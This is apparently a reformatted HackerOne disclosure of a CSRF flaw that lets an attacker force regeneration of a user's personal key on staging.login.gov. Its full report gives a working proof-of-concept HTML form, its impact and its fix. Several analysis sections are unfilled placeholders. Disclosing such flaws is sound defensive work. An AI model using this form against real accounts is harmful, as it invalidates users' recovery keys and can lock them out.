# CSRF in generating a new Personal Key

## Metadata
- **Source:** HackerOne
- **Report:** 263512 | https://hackerone.com/reports/263512
- **Submitted:** 2017-08-26
- **Reporter:** streaak
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** medium
- **Vuln:** Cross-Site Request Forgery (CSRF)
- **CVEs:** None
- **Category:** web-api

## Summary
Hello team,
I would like to report a CSRF which would allow an attacker to change a user's personal key.

**Vulnerable URL-**
staging.login.gov

**POC-**

Use the following HTML form for performing the CSRF attack-

```
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://staging.login.gov/manage/personal_key">
      <input type="hidden" name="resend" value="

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Hello team,
I would like to report a CSRF which would allow an attacker to change a user's personal key.

**Vulnerable URL-**
staging.login.gov

**POC-**

Use the following HTML form for performing the CSRF attack-

```
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://staging.login.gov/manage/personal_key">
      <input type="hidden" name="resend" value="true" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

This will redirect you to https://staging.login.gov/manage/personal_key?resend=true and we can use the key on the screen to login as the old key will be rendered invalid.

PS- The user doesn't have to click on continue on the above page. The key would be changed either way. You can logout and login and test the new key and you will be successfully logged into the account.

**IMPACT-**
This will pretty much deny a user to login to his system who has "his device stolen or accounts hacked" as mentioned by your policy.

**FIX-**
Add a CSRF token while submitting the form.

Let me know if you need anything else.

Best regards,
Streaak2





</details>

---
*Analysed by Claude on 2026-05-24*
